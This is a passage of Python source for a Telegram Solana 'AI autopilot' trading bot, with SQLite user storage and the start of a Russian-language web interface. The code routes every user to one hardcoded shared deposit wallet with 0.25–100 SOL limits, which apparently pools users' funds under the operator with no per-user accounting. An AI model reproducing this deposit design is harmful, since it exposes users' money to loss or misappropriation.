import asyncio
import aiohttp
from aiohttp import web
import sqlite3
import os
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")
DB_FILE = "zer0life_users.db"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"

SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
MIN_DEPOSIT_SOL = 0.25
MAX_DEPOSIT_SOL = 100.0

TOKENS = {
    "SOL": "So11111111111111111111111111111111111111112",
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "MEME_HOT": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            solana_wallet TEXT,
            trading_active INTEGER DEFAULT 0,
            trade_mode TEXT DEFAULT 'SOL_USDC',
            trade_amount_sol REAL DEFAULT 0.05,
            slippage_bps INTEGER DEFAULT 150,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_or_create_user(telegram_id: int, username: str, first_name: str):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
                       (telegram_id, username, first_name, SHARED_DEPOSIT_WALLET, 0, 'SOL_USDC', 0.05, 150))
        conn.commit()
        user = {"telegram_id": telegram_id, "username": username, "first_name": first_name, "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": 0, "trade_mode": 'SOL_USDC', "trade_amount_sol": 0.05, "slippage_bps": 150}
    else:
        user = {"telegram_id": row[0], "username": row[1], "first_name": row[2], "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": row[4], "trade_mode": row[5], "trade_amount_sol": row[6], "slippage_bps": row[7]}
    
    conn.close()
    return user

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0Life Web4 AI Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #03050a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 16px; padding-bottom: 110px; }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

        .card { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(12px); border-radius: 20px; padding: 20px; margin-bottom: 18px; border: 1px solid rgba(124, 58, 237, 0.2); box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
        .profile-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
        
        .input-field { width: 100%; background: #020617; border: 1px solid rgba(52, 211, 153, 0.3); color: #34d399; padding: 14px; border-radius: 14px; margin-top: 8px; font-family: monospace; font-size: 11px; text-align: center; outline: none; }
        
        .btn { background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%); color: white; border: none; width: 100%; padding: 14px; border-radius: 14px; font-weight: 700; cursor: pointer; margin-top: 12px; font-size: 14px; box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4); }
        .btn:active { transform: scale(0.98); }
        .btn-green { background: linear-gradient(135deg, #10b981 0%, #059669 100%); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4); }
        .btn-red { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4); }
        
        .btn-mode { background: rgba(30, 41, 59, 0.8); color: #94a3b8; border: 1px solid rgba(51, 65, 85, 0.8); margin-top: 8px; width: 100%; padding: 14px; border-radius: 14px; font-weight: bold; cursor: pointer; text-align: left; display: flex; justify-content
